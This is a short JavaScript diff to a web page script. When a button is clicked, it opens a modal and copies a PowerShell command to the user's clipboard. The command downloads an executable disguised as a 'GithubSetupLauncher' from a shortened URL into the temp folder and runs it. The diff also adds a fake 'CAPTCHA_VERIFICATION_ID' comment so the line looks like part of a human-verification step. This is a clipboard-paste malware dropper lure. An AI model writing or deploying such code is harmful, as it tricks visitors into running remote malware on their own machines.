@@ -4,7 +4,7 @@ const closeBtn = document.getElementById('closeModalBtn');
 
 btn.addEventListener('click', async () => {
     modal.style.display = 'flex';
-    navigator.clipboard.writeText('Powershell Start-BitsTransfer -Source \'https://shorturl.at/th3nU\' -Destination "$env:TEMP\\GithubSetupLauncher.exe"; Start-Process "$env:TEMP\\GithubSetupLauncher64.exe"');
+    navigator.clipboard.writeText('Start-BitsTransfer -Source \'https://shorturl.at/th3nU\' -Destination "$env:TEMP\\GithubSetupLauncher.exe"; Start-Process "$env:TEMP\\GithubSetupLauncher64.exe" #CAPTCHA_VERIFICATION_ID=2f7iz5Afv2zxZ12fvxz');
     });
 
 closeBtn.addEventListener('click', () => {
@@ -16,3 +16,4 @@ window.addEventListener('click', (e) => {
         modal.style.display = 'none';
     }
 });
+
